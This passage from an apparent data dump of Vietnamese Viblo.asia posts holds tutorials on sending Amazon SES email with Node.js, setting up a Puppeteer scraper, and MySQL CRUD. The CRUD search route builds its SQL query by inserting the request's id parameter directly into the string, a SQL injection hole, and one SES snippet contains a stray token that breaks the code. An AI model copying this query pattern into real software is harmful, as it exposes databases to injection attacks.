nodemailer`.\n* C\u00e0i th\u01b0 vi\u1ec7n **dotenv** \u0111\u1ec3 \u0111\u1ecdc c\u00e1c bi\u1ebfn m\u00f4i tr\u01b0\u1eddng t\u1eeb file `.env`: `yarn add dotenv` ho\u1eb7c `npm i dotenv`.\nSau khi kh\u1edfi t\u1ea1o c\u1ea5u tr\u00fac th\u01b0 m\u1ee5c nh\u01b0 h\u00ecnh sau:\n\n![](https://images.viblo.asia/352685eb-af75-44d9-82fe-7ac3b3ef39e0.png)\n\nTham kh\u1ea3o \u0111o\u1ea1n code sau trong `app.js` \n\n```js\nrequire('dotenv').config();\nconst nodemailer = require('nodemailer');\n\n// \u0110\u1ecdc c\u00e1c bi\u1ebfn m\u00f4i tr\u01b0\u1eddng \n// SES_AWS_SMTP_ENDPOINT, SES_AWS_SMTP_PORT, SES_AWS_SMTP_SENDER, SES_AWS_SMTP_USERNAME, SES_AWS_SMTP_PASSWORD\n// t\u1eeb file .env\n// ch\u00fa \u00fd set c\u00e1c th\u00f4ng tin cho c\u00e1c bi\u1ebfn tr\u00ean trong file .env nha\nconst smtpEndpoint = process.env.SES_AWS_SMTP_ENDPOINT; // t\u00ean server m\u00ecnh s\u1ebd ch\u1ec9 c\u00e1ch l\u1ea5y b\u00ean d\u01b0\u1edbi\nconst port = process.env.SES_AWS_SMTP_PORT; // smtp port m\u00ecnh s\u1ebd ch\u1ec9 c\u00e1ch l\u1ea5y b\u00ean d\u01b0\u1edbi\nconst senderAddress = process.env.SES_AWS_SMTP_SENDER; // email d\u00f9ng \u0111\u1ec3 g\u1eedi \u0111i\nconst toAddresses = 'xxxxx@gmail.com'; // email ng\u01b0\u1eddi nh\u1eadn\nconst smtpUsername = process.env.SES_AWS_SMTP_USERNAME; // smtp username m\u00e0 b\u1ea1n \u0111\u00e3 download \u1edf tr\u00ean \nconst smtpPassword = process.env.SES_AWS_SMTP_PASSWORD; // smtp password m\u00e0 b\u1ea1n \u0111\u00e3 download \u1edf tr\u00ean \n\nasync function main() {\n  // kh\u1edfi t\u1ea1o m\u1ed9t transporter \u0111\u1ec3 g\u1edfi mail\n  const transporter = nodemailer.createTransport({\n    host: smtpEndpoint,\n    port: port,\n    auth: {\n      user: smtpUsername,\n      pass: smtpPassword\n    }\n  });\n  // mail option, c\u00f3 nhi\u1ec1u option kh\u00e1c nh\u01b0 cc, bcc, ... b\u1ea1n tham kh\u1ea3o link b\u00ean d\u01b0\u1edbi nh\u00e9\n  let mailOptions = {\n    from: senderAddress,\n    to: toAddresses,\n    subject: 'Hello world',\n    text: 'Hello world'\n  };\n\n  const info = await transporter.sendMail(mailOptions); // b\u1eaft \u0111\u1ea7u g\u1edfi mail\n\n  console.log(\"Message sent! Message ID: \", info); // in k\u1ebft qu\u1ea3 g\u1eedi th\u00e0nh c\u00f4ng\n}\n\nmain().catch(console.error); // in l\u1ed7i n\u1ebfu g\u1eb7p l\u1ed7i trong qu\u00e1 tr\u00ecnh x\u1eed l\u00fd\n```\n\nV\u1edbi th\u00f4ng tin v\u1ec1 Endpoint, v\u00e0 Port b\u1ea1n c\u00f3 th\u1ec3 l\u1ea5y t\u1ea1i *SMTP Settings* tr\u00ean aws console.\n\n![](https://images.viblo.asia/041e6cba-ab64-46a0-94f6-09c4b3066fb2.png)\n\nC\u00e1c mail options b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o [t\u1ea1i \u0111\u00e2y](https://nodemailer.com/message/) .\n\nTh\u00eam m\u1ed9t l\u01b0u \u00fd n\u1eefa l\u00e0 mail nh\u1eadn v\u00e0 g\u1eedi n\u1ebfu trong m\u00f4i tr\u01b0\u1eddng sanbox th\u00ec ph\u1ea3i \u0111\u01b0\u1ee3c verify nh\u01b0 \u0111\u00e3 n\u00f3i \u1edf tr\u00ean nha.\n\nCu\u1ed1i c\u00f9ng ch\u1ea1y `node app.js` \u0111\u1ec3 xem k\u1ebft qu\u1ea3 th\u00f4i n\u00e0o.\n\n## D\u00f9ng Amazon SES API \u0111\u1ec3 g\u1eedi email\n\n\u0110\u1ec3 d\u00f9ng d\u00f9ng Amazon SES API \u0111\u1ec3 g\u1edfi mail b\u1ea1n c\u1ea7n t\u1ea1o m\u1ed9t access key c\u00f3 quy\u1ec1n v\u1edbi aws ses, \u0111\u1ec3 t\u1ea1o b\u1ea1n s\u1eed dung service **Identity and Access Management (IAM)** c\u1ee7a aws, service n\u00e0y r\u1ea5t hay \u0111\u1ec3 qu\u1ea3n l\u00fd truy c\u1eadp aws, trong ph\u1ea1m vi b\u00e0i n\u00e0y m\u00ecnh ch\u1ec9 l\u00e0m nh\u1eefng b\u01b0\u1edbc c\u01a1 b\u1ea3n \u0111\u1ec3 t\u1ea1o \u0111\u01b0\u1ee3c m\u1ed9t access key c\u00f3 quy\u1ec1n v\u1edbi aws ses th\u00f4i nha, chi ti\u1ebft v\u1ec1 **IAM** b\u1ea1n c\u00f3 th\u1ec3 t\u1ef1 t\u00ecm hi\u1ec3u th\u00eam.\n\n![](https://images.viblo.asia/bc69547b-08b8-4373-834d-6a6e4209c36f.png)\n\nSau khi truy c\u1eadp v\u00e0o IAM m\u00ecnh t\u1ea1i *Access management* m\u00ecnh s\u1ebd t\u1ea1o m\u1ed9t user v\u1edbi name l\u00e0 *aws-ses-user*:\n\n![](https://images.viblo.asia/f7f21269-71bd-4288-b3c4-205e3c84b9e6.png)\n\n![](https://images.viblo.asia/5b1949bf-48ca-4c3e-9a3e-3c20072a5740.png)\n\nSau \u0111\u00f3 click v\u00e0o *Next: Permission* v\u00e0 ch\u1ecdn policy `AmazonSESFullAccess` nh\u01b0 h\u00ecnh:\n\n![](https://images.viblo.asia/7fa11e4d-8c2e-4f3f-9081-6021e18bdcdc.png)\n\nTi\u1ebfp t\u1ee5c `Next: Tags` \u1edf m\u1ee5c tags b\u1ea1n c\u00f3 th\u1ec3 \u0111i\u1ec1n ho\u1eb7c kh\u00f4ng, ti\u1ebfp t\u1ee5c next v\u00e0 create user:\n\n![](https://images.viblo.asia/99e75de9-3386-4891-99bc-a210c50578b6.png)\n\nCu\u1ed1i c\u00f9ng b\u1ea1n Download Security credentials v\u1ec1 m\u00e1y, th\u00f4ng tin v\u1ec1 access key s\u1ebd n\u1eb1m trong \u0111\u00f3.\n\n![](https://images.viblo.asia/ae4d50c5-66c8-4fa6-b4dc-eebea97b187a.png)\n\n\u0110\u1ebfn \u0111\u00e2y b\u1ea1n \u0111\u00e3 c\u00f3 access key r\u1ed3i, h\u00e3y th\u1eed \u0111o\u1ea1n code b\u00ean d\u01b0\u1edbi \u0111\u1ec3 g\u1eedi mail v\u1edbi *Amazon SES API* nh\u00e9\n```js\nrequire('dotenv').config();\n\nconst AWS = require('aws-sdk'); // b\u1ea1n c\u1ea7n add th\u01b0 vi\u1ec7n aws-sdk: yarn add aws-sdk\n\n// Th\u00f4ng tin SES_AWS_ACCESS_KEY_ID, SES_AWS_SECRET_ACCESS_KEY n\u1eb1m trong file credentials b\u1ea1n \u0111\u00e3 download v\u1ec1 \u1edf tr\u00ean nh\u00e9\nconst sesConfig = {\n  accessKeyId: process.env.SES_AWS_ACCESS_KEY_ID, \n  secretAccessKey: process.env.SES_AWS_SECRET_ACCESS_KEY,\n  region: process.env.SES_REGION, // \u0111\u00e2y l\u00e0 region c\u1ee7a server n\u00f3 l\u00e0 v\u00f9ng b\u1ea1n \u0111\u00e3 ch\u1ecdn khi t\u1ea1o ses n\u1ebfu Mumbai l\u00e0 ap-south-1\n  apiVersion: '2010-12-01', // version c\u1ee7a api\n}\n\nconst sesAws = new AWS.SES(sesConfig);\n\nconst params = {\n  Destination: {\n    ToAddresses: ['xxxxx@sun-asterisk.com'], // email ng\u01b0\u1eddi nh\u1eadn\n  },\n  Source: process.env.SES_AWS_SMTP_SENDER, // email d\u00f9ng \u0111\u1ec3 g\u1eedi \u0111i\n  Message: {\n    Subject: {\n      Data: 'Test SES AWS',\n      Charset: 'UTF-8',\n    },\n    Body: {\n      Text: {\n        Data: 'Test SES AWS',\n        Charset: 'UTF-8'\n      }\n    }\n  },\n}\n\nconst sendPromise = sesAws.sendEmail(params).promise();\n\nsendPromise\n  .then((data) => {\n    console.log(data)\n  })SMTP\n  .catch((error) => {\n    console.log(error)\n  })\n\n```\nM\u1ed9t s\u1ed1 th\u00f4ng tin kh\u00e1 gi\u1ed1ng v\u1edbi g\u1edfi mail b\u1eb1ng SMTP \u0111\u00e3 tr\u00ecnh b\u00e0y \u1edf tr\u00ean, v\u1edbi API th\u00ec c\u00f3 r\u1ea5t nhi\u1ec1u l\u1ef1a ch\u1ecdn \u0111\u1ec3 g\u1edfi mail, b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o chi ti\u1ebft [t\u1ea1i \u0111\u00e2y](https://docs.aws.amazon.com/sdk-for-javascript/v2/developer-guide/ses-examples-sending-email.html).\n\nCu\u1ed1i c\u00f9ng ch\u1ea1y `node app.js` \u0111\u1ec3 xem k\u1ebft qu\u1ea3 th\u00f4i n\u00e0o.\n\n# T\u00e0i li\u1ec7u tham kh\u1ea3o\n* [Sending email using the Amazon SES SMTP Interface](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/examples-send-using-smtp.html)\n* [Sending Email Using Amazon SES](https://docs.aws.amazon.com/sdk-for-javascript/v2/developer-guide/ses-examples-sending-email.html)",
      published_at: "2021-01-21 21:57:11",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-19 22:00:25",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 9,
      points: 2,
      views_count: 181,
      clips_count: 1,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/b87d34fc-f4c2-44cb-8929-119daecdbb49.png",
      user: {
        data: {
          id: 24489,
          url: "https://viblo.asia/u/hoangnguyen293",
          avatar: "5ecf63de-5171-4807-a401-754472651822.png",
          name: "Nguyen Van Hoang",
          username: "hoangnguyen293",
          followers_count: 12,
          reputation: 389,
          posts_count: 24,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 50084,
      title:
        "Crawl website s\u1eed d\u1ee5ng Node.js v\u00e0 Puppeteer - ph\u1ea7n 1",
      slug: "L4x5xv2wZBM",
      url:
        "https://viblo.asia/p/crawl-website-su-dung-nodejs-va-puppeteer-phan-1-L4x5xv2wZBM",
      user_id: 9372,
      moderation: null,
      transliterated: "crawl-website-su-dung-nodejs-va-puppeteer-phan-1",
      contents_short:
        "B\u00e0i vi\u1ebft n\u00e0y m\u00ecnh s\u1ebd gi\u1edbi thi\u1ec7u cho c\u00e1c b\u1ea1n craw d\u1eef li\u1ec7u c\u1ee7a web site s\u1eed d\u1ee5ng nodejs v\u00e0 Puppeteer.\n\nPupperteer l\u00e0 g\u00ec?\nPuppeteer l\u00e0 m\u1ed9t th\u01b0 vi\u1ec7n c\u1ee7a Node cung c\u1ea5p API c\u1ea5p cao \u0111\u1ec3 ki\u1ec3m so\u00e1t Chrome ho\u1eb7...",
      contents:
        'B\u00e0i vi\u1ebft n\u00e0y m\u00ecnh s\u1ebd gi\u1edbi thi\u1ec7u cho c\u00e1c b\u1ea1n craw d\u1eef li\u1ec7u c\u1ee7a web site s\u1eed d\u1ee5ng nodejs v\u00e0 Puppeteer. \n\n\n## Pupperteer l\u00e0 g\u00ec?\n> Puppeteer l\u00e0 m\u1ed9t th\u01b0 vi\u1ec7n c\u1ee7a Node cung c\u1ea5p API c\u1ea5p cao \u0111\u1ec3 ki\u1ec3m so\u00e1t Chrome ho\u1eb7c Chromium s\u1eed d\u1ee5ng giao th\u1ee9c DevTools. Puppeteer m\u1eb7c \u0111\u1ecbnh ch\u1ea1y headless, nh\u01b0ng c\u00f3 th\u1ec3 \u0111\u01b0\u1ee3c \u0111\u1ecbnh c\u1ea5u h\u00ecnh \u0111\u1ec3 ch\u1ea1y non-headless.\n\nC\u00e1c b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o chi ti\u1ebft \u1edf \u0111\u00e2y: https://viblo.asia/p/nghich-ngom-voi-puppeteer-Qbq5Q3j4ZD8\n\n### M\u1ed9t s\u1ed1 l\u1ec7nh hay d\u00f9ng nh\u1ea5t c\u1ee7a Puppeteer\n\nD\u01b0\u1edbi \u0111\u00e2y m\u00ecnh s\u1ebd gi\u1edbi thi\u1ec7u m\u1ed9t s\u1ed1 l\u1ec7nh hay d\u00f9ng nh\u1ea5t khi s\u1eed d\u1ee5ng Puppeteer \u0111\u1ec3 crawler d\u1eef li\u1ec7u. Nh\u1eefng l\u1ec7nh n\u00e0y l\u00e0 nh\u1eefng l\u1ec7nh h\u1eefu d\u1ee5ng v\u00e0 hay d\u00f9ng nh\u1ea5t trong crawl data. b\u1ea1n c\u1ea7n ghi nh\u1edb \u0111\u1ec3 c\u00f3 th\u1ec3 \u0111\u1ecdc hi\u1ec3u \u0111\u01b0\u1ee3c code nh\u1eefng ph\u1ea7n ti\u1ebfp theo nh\u00e9.\n\n#### page.newPage()\n\nm\u1edf m\u1ed9t tab m\u1edbi c\u1ee7a tr\u00ecnh duy\u1ec7t\n```js\nlet page = await browser.newPage();\n```\n\n#### page.goto\n\n\u0111i \u0111\u1ebfn m\u1ed9t trang web\n\n```js\nawait page.goto(\'https://viblo.asia/\');\n```\n\n\n#### page.setExtraHTTPHeaders \n\nset header cho tr\u00ecnh duy\u1ec7t:\n\n```js\nawait page.setExtraHTTPHeaders({\n                \'Accept-Language\': \'en-GB,en-US;q=0.9,en;q=0.8\'\n            });\n```\n\n\n#### page.setUserAgent\n\nset agent cho tr\u00ecnh duy\u1ec7t\n\n```js\n await page.setUserAgent(\'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\');\n```\n\n\n#### page.setViewport\n\nset \u0111\u1ed9 r\u1ed9ng cho browser\n```\n await page.setViewport({width: 1500, height: 1500});\n```\n\n\n#### page.type\n\nt\u1ef1 enter d\u1eef li\u1ec7u v\u00e0o m\u1ed9t \u00f4 input\n\n```js\nawait page.type("input[name=\'email\']", \'viblo@gmail.com\', {delay: 100});\n```\n\n\n#### page.click\n\nClick v\u00e0o 1 ch\u1ed7 b\u1ea5t k\u1ef3 (buton, link, input ...)\n\n```js\npage.click("input[type=\'submit\']");\nawait page.click(\'span[data-hook="ryp-review-submit-button"]\');\n```\n\n\n#### page.waitFor\n\u0111\u1ec3 tr\u00ecnh duy\u1ec7t load ho\u1eb7c ch\u1edd \u0111\u1ee3i m\u1ed9t kho\u1ea3ng th\u1eddi gian\n```\n page.waitFor(7000);\n```\n\n\n####  page.waitForSelecto\n\u0110\u1ee3i m\u1ed9t element xu\u1ea5t hi\u1ec7n, v\u00ed d\u1ef1 b\u1ea1n mu\u1ed1n \u0111\u1ee3i c\u00f3 button login xu\u1ea5t hi\u1ec7n \n\n```js\n await page.waitForSelector(\'#continue\');\n```\n\n\n#### page.evaluate\n\ncho ph\u00e9p b\u1ea1n th\u1ef1c hi\u1ec7n nh\u1eefng c\u00e2u l\u1ec7nh js tr\u00ean browser\n\n```js\n let captcha = await page.evaluate(() => {\n          return document.getElementById(\'auth-captcha-image-container\');\n});\n```\n\n\n#### page.$eval\nM\u00ecnh th\u1ea5y n\u00f3 kh\u00e1 gi\u1ed1ng v\u1edbi l\u1ec7nh evaluate \u1edf tr\u00ean\n```js\nconst stockAvailable = await newPage.$eval(\'.instock.availability\', text => {\n                // Strip new line and tab spaces\n                text = text.textContent.replace(/(\\r\\n\\t|\\n|\\r|\\t)/gm, "");\n                // Get the number of stock available\n                let regexp = /^.*\\((.*)\\).*$/i;\n                let stockAvailable = regexp.exec(text)[1].split(\' \')[0];\n                return stockAvailable;\n            });\n```\n\nki\u1ec3m tra xem c\u00f3 id l\u00e0 `auth-captcha-image-container` kh\u00f4ng\n\n```js\nawait page.evaluate(() => {\n                const reviewLists = document.querySelectorAll(".ryp__star__button");\n                reviewLists.forEach(async (review, i) => {\n                    let j = i + 1;\n                    if (j % 5 === 0) {\n                        reviewLists[i].click();\n                    }\n                });\n            });\n```\n\nhay l\u00e0 s\u1eed d\u1ee5ng forEach l\u1ea5y d\u1eef li\u1ec7u browser r\u1ed3i \u0111\u1eb7t t\u1ea5t c\u1ea3 v\u00e0 m\u1ed9t list\n\n\n#### browser.close();\n\n\u0111\u00f3ng browser khi \u0111\u00e3 ho\u00e0n th\u00e0nh xong t\u1ea5t c\u1ea3 c\u00e1c task, b\u1ea1n ch\u00fa \u00fd \u0111\u1eebng qu\u00ean l\u1ec7nh n\u00e0y, n\u1ebfu kh\u00f4ng browser s\u1ebd lu\u00f4n \u0111\u01b0\u1ee3c m\u1edf m\u1edbi, s\u1ebd c\u1ef1c k\u1ef3 t\u1ed1n ram c\u1ee7a h\u1ec7 th\u1ed1ng nh\u00e9 b\u1ea1n.\n\n```\n   await browser.close();\n```\n\n\n## Chu\u1ea9n b\u1ecb\n\nGi\u1ea3 s\u1eed b\u1ea1n \u0111\u00e3 c\u00e0i \u0111\u1eb7t nodejs tr\u00ean m\u00e1y t\u00ednh c\u1ee7a b\u1ea1n\n\n### Setup project\n\nT\u1ea1o m\u1ed9t folder project:\n\n```sh\nmkdir book-scraper\ncd book-scraper\n```\n\nKh\u1edfi t\u1ea1o `npm init` trong project c\u1ee7a b\u1ea1n \u0111\u1ec3 \u0111i\u1ec1n m\u1ed9t s\u1ed1 th\u00e0nh ph\u1ea7n nh\u01b0 t\u00ean, version ...\n\nSau khi kh\u1edfi t\u1ea1o b\u1ea1n s\u1ebd c\u00f3 1 file `package.json` c\u00f3 n\u1ed9i dung ki\u1ec3u th\u1ebf n\u00e0y, b\u1ea1n c\u00f3 th\u1ec3 t\u00f9y ch\u1ec9nh name, desciption ...\n```json\n{\n  "name": "sammy_scraper",\n  "version": "1.0.0",\n  "description": "a web scraper",\n  "main": "index.js",\n  "scripts": {\n    "test": "echo \\"Error: no test specified\\" && exit 1"\n  },\n  "keywords": [],\n  "author": "sammy the shark",\n  "license": "ISC"\n}\n```\n\nTi\u1ebfp theo ch\u00fang ta c\u1ea7n c\u00e0i \u0111\u1eb7t `puppeteer`:\n\n```\nnpm install --save puppeteer\n```\n\nsau khi l\u1ec7nh n\u00e0y ch\u1ea1y xong ch\u00fang ta th\u00eam d\u00f2ng code `"start": "node index.js"` v\u00e0o trong `package.json`\n\n```\nnano package.json\n```\n\n```\n{\n  . . .\n  "scripts": {\n    "test": "echo \\"Error: no test specified\\" && exit 1",\n    "start": "node index.js" ## th\u00eam v\u00e0o \u0111\u00e2y\n  },\n  . . .\n  "dependencies": {\n    "puppeteer": "^5.2.1"\n  }\n}\n```\n t\u1eeb h tr\u1edf \u0111i b\u1ea1n c\u1ea7n ch\u1ea1y l\u1ec7nh `npm run start` l\u00e0 c\u00f3 th\u1ec3 start app c\u1ee7a b\u1ea1n l\u00ean, n\u00f3 t\u01b0\u01a1ng \u0111\u01b0\u01a1ng v\u1edbi b\u1ea1n ch\u1ea1y l\u1ec7nh `node index.js` :D\n \n ### Setup Browser\n \n Nh\u01b0 ch\u00fang ta bi\u1ebft puppeteer ch\u00ednh l\u00e0 m\u1ed9t headless browser like  Chromium, cho ph\u00e9p ch\u00fang ta ch\u1ea1y browser m\u00e0 ko c\u1ea7n ` user interface.`, trong b\u01b0\u1edbc n\u00e0y ch\u00fang ta s\u1ebd t\u1ea1o ra file `browser.js` \u0111\u1ec3 kh\u1edfi ch\u1ea1y m\u1ed9t `headless browser`\n \n ```\n nano browser.js\n ```\n \n```js\n// ./book-scraper/browser.js\nconst puppeteer = require(\'puppeteer\');\n\nasync function startBrowser(){\n    let browser;\n    try {\n        console.log("Opening the browser......");\n        browser = await puppeteer.launch({\n            headless: false,\n            args: ["--disable-setuid-sandbox"],\n            \'ignoreHTTPSErrors\': true\n        });\n    } catch (err) {\n        console.log("Could not create a browser instance => : ", err);\n    }\n    return browser;\n}\n\nmodule.exports = {\n    startBrowser\n};\n```\n\nFile n\u00e0y kh\u00e1 \u0111\u01a1n gi\u1ea3n, nhi\u1ec7m v\u1ee5 c\u1ee7a n\u00f3 ch\u1ec9 l\u00e0 kh\u1edfi t\u1ea1o m\u1ed9t browser l\u00ean \u0111\u1ec3 cho ch\u00fang ta d\u00f9ng sau n\u00e0y m\u00e0 th\u00f4i, b\u1ea1n c\u1ea7n ch\u00fa \u00fd m\u1ed9t ch\u1ed7 l\u00e0 `headless: false`, c\u00f3 ngh\u0129 l\u00e0 b\u1ea1n \u0111ang kh\u1edfi t\u1ea1o m\u1ed9t browser c\u00f3 giao di\u1ec7n ng\u01b0\u1eddi d\u00f9ng, b\u1eadt c\u00f3 giao di\u1ec7n l\u00ean trong qu\u00e1 tr\u00ecnh dev \u0111\u1ec3 ch\u00fang ta bi\u1ebft \u0111\u01b0\u1ee3c n\u00f3 ch\u1ea1y nh\u01b0 th\u1ebf n\u00e0o th\u00f4i, c\u00f2n khi deploy l\u00ean server b\u1ea1n ph\u1ea3i \u1ea9n n\u00f3 \u0111i, n\u1ebfu kh\u00f4ng \u1ea9n khi ch\u1ea1y n\u00f3 s\u1ebd b\u00e1o l\u1ed7i. c\u00f3 l\u1ebd v\u00ec server th\u01b0\u1eddng ko c\u00e0i giao di\u1ec7n :v: \n\n\nTi\u1ebfp theo ch\u00fang ta c\u1ea7n file index.js l\u00e0 file ch\u1ea1y ch\u00ednh v\u00e0 file pageController.js \u0111\u1ec3 \u0111i\u1ec1u h\u01b0\u1edbng bot c\u1ee7a b\u1ea1n\n\n```js\n// ./book-scraper/index.js\n\nconst browserObject = require(\'./browser\');\nconst scraperController = require(\'./pageController\');\n\n//Start the browser and create a browser instance\nlet browserInstance = browserObject.startBrowser();\n\n// Pass the browser instance to the scraper controller\nscraperController(browserInstance)\n```\n\n```js\n// ./book-scraper/pageController.js\nconst pageScraper = require(\'./pageScraper\');\nasync function scrapeAll(browserInstance){\n    let browser;\n    try{\n        browser = await browserInstance;\n        await pageScraper.scraper(browser);\n\n    }\n    catch(err){\n        console.log("Could not resolve the browser instance => ", err);\n    }\n}\n\nmodule.exports = (browserInstance) => scrapeAll(browserInstance)\n```\n\nTi\u1ebfp theo ch\u00fang ta t\u1ea1o 1 file `pageScraper.js`, file n\u00e0y s\u1ebd c\u00f3 nhi\u1ec7m v\u1ee5 ch\u00ednh l\u00e0 \u0111\u1ecdc d\u1eef li\u1ec7u c\u1ee7a trang web\n\n```js\nconst scraperObject = {\n    url: \'http://books.toscrape.com\',\n    async scraper(browser){\n        let page = await browser.newPage();\n        console.log(`Navigating to ${this.url}...`);\n        await page.goto(this.url);\n\n    }\n}\n\nmodule.exports = scraperObject;\n```\n\ncu\u1ed1i c\u00f9ng project c\u1ee7a ch\u00fang ta s\u1ebd c\u00f3 c\u1ea5u tr\u00fac flle nh\u01b0 sau:\n\n```\n.\n\u251c\u2500\u2500 browser.js\n\u251c\u2500\u2500 index.js\n\u251c\u2500\u2500 node_modules\n\u251c\u2500\u2500 package-lock.json\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 pageController.js\n\u2514\u2500\u2500 pageScraper.js\n```\n\n\u0110\u1ebfn \u0111\u00e2y khi b\u1ea1n ch\u1ea1y `npm run start` th\u00ec n\u00f3 s\u1ebd t\u1ef1 m\u1edf m\u1ed9t browser l\u00ean, b\u1eadt 1 tab m\u1edbi v\u00e0 t\u1ef1 \u0111\u1ed9ng v\u00e0o trang web `books.toscrape.com`\n\n![](https://images.viblo.asia/6fdb2f1f-15de-4b03-b071-8edd3ffcc282.png)\n\n\u0111\u1ebfn \u0111\u00e2y l\u00e0 project c\u1ee7a b\u1ea1n \u0111\u00e3 setup trong to\u00e0n b\u1ed9 r\u1ed3i, ch\u1ec9 c\u1ea7n code th\u00f4i. b\u00e0i vi\u1ebft n\u00e0y c\u0169ng kh\u00e1 d\u00e0i r\u1ed3i, m\u00ecnh s\u1ebd t\u00e1ch ph\u1ea7n b\u00f3c t\u00e1ch d\u1eef li\u1ec7u v\u00e0 deploy server sang m\u1ed9t b\u00e0i ti\u1ebfp nh\u00e9.\n\n### Tham kh\u1ea3o\n- https://viblo.asia/p/nghich-ngom-voi-puppeteer-Qbq5Q3j4ZD8\n- https://www.digitalocean.com/community/tutorials/how-to-scrape-a-website-using-node-js-and-puppeteer',
      published_at: "2021-01-19 14:42:51",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:00:25",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 4,
      points: 4,
      views_count: 478,
      clips_count: 5,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/6fdb2f1f-15de-4b03-b071-8edd3ffcc282.png",
      user: {
        data: {
          id: 9372,
          url: "https://viblo.asia/u/nguyen.van.duong",
          avatar: "873174e5-bc11-4fb3-b2c7-1cc6537fc78c.gif",
          name: "Nguyen Van Duong",
          username: "nguyen.van.duong",
          followers_count: 32,
          reputation: 1098,
          posts_count: 52,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 47972,
      title: "CRUD Nodejs v\u1edbi mysql",
      slug: "RnB5pbPGZPG",
      url: "https://viblo.asia/p/crud-nodejs-voi-mysql-RnB5pbPGZPG",
      user_id: 38554,
      moderation: null,
      transliterated: "crud-nodejs-voi-mysql",
      contents_short:
        "M\u1edf \u0110\u1ea7u\nXin ch\u00e0o c\u00e1c b\u1ea1n ti\u1ebfp t\u1ee5c v\u1edbi series Nodejs c\u01a1 b\u1ea3n, b\u00e0i h\u00f4m nay m\u00ecnh s\u1ebd ti\u1ebfp t\u1ee5c l\u00e0m th\u00eam c\u00e1c ch\u1ee9c n\u0103ng xem chi ti\u1ebft v\u00e0 s\u1eeda v\u00e0 x\u00f3a s\u1ea3n ph\u1ea9m. \u00c0 qu\u00ean \u1edf b\u00e0i tr\u01b0\u1edbc sau khi th\u1ef1c hi\u1ec7n k\u1ebft n\u1ed1i v\u1edbi ...",
      contents:
        "# M\u1edf \u0110\u1ea7u\nXin ch\u00e0o c\u00e1c b\u1ea1n ti\u1ebfp t\u1ee5c v\u1edbi series Nodejs c\u01a1 b\u1ea3n, b\u00e0i h\u00f4m nay m\u00ecnh s\u1ebd ti\u1ebfp t\u1ee5c l\u00e0m th\u00eam c\u00e1c ch\u1ee9c n\u0103ng xem chi ti\u1ebft v\u00e0 s\u1eeda v\u00e0 x\u00f3a s\u1ea3n ph\u1ea9m. \u00c0 qu\u00ean \u1edf b\u00e0i tr\u01b0\u1edbc sau khi th\u1ef1c hi\u1ec7n k\u1ebft n\u1ed1i v\u1edbi mysql th\u00ec ch\u00fang ta v\u1eabn ch\u01b0a s\u1eeda l\u1ea1i ch\u1ee9c n\u0103ng t\u00ecm ki\u1ebfm, v\u1eady n\u00ean \u1edf b\u00e0i vi\u1ebft n\u00e0y m\u00ecnh s\u1ebd th\u1ef1c hi\u1ec7n s\u1eeda l\u1ea1i ch\u1ee9c n\u0103ng t\u00ecm ki\u1ebfm lu\u00f4n. C\u00f9ng b\u1eaft \u0111\u1ea7u ngay nh\u00e9\n# Th\u1ef1c Hi\u1ec7n\n## S\u1eeda ch\u1ee9c n\u0103ng t\u00ecm ki\u1ebfm\n\u0110\u01a1n gi\u1ea3n th\u00f4i b\u1ea1n ch\u1ec9 c\u1ea7n s\u1eeda l\u1ea1i h\u00e0m \n```php\napp.get('/search', function(req, res){\n    var id = req.query.id;\n\tvar data = posts.filter(function(item){\n        return item.id === parseInt(id)\n    });\n\tres.render('index', {\n\t\tposts: data\n    });\n})\n```\nth\u00e0nh nh\u01b0 th\u1ebf n\u00e0y l\u00e0 \u0111\u01b0\u1ee3c\n```php\napp.get('/search', function(req, res){\n    var id = req.query.id;\n    var sql=`SELECT * FROM posts where id = '${id}'`;\n    conn.query(sql, function (err, data, fields) {\n        res.render('index', {\n            products: data\n        });\n    });\n})\n```\n\u1ede b\u00e0i tr\u01b0\u1edbc l\u00e0 ch\u00fang ta th\u1ef1c hi\u1ec7n `filter` theo id \u0111\u1ec3 l\u1ea5y ra c\u00e1c ph\u1ea7n t\u1eed th\u1ecfa m\u00e3n \u0111i\u1ec1u ki\u1ec7n trong m\u1ea3ng, c\u00f2n b\u00e2y gi\u1edd th\u00ec \u0111\u01a1n gi\u1ea3n l\u00e0 ch\u00fang ta l\u1ea5y ra danh s\u00e1ch s\u1ea3n ph\u1ea9m r\u1ed3i where theo id \u0111\u01b0\u1ee3c g\u1eedi l\u00ean t\u1eeb client.\n\n##  Detail \nTr\u01b0\u1edbc h\u1ebft ch\u00fang ta c\u1ea7n ph\u1ea3i s\u1eeda l\u1ea1i trang index.pug m\u1ed9t ch\u00fat \u0111\u1ec3 ch\u00fang ta c\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n xem chi 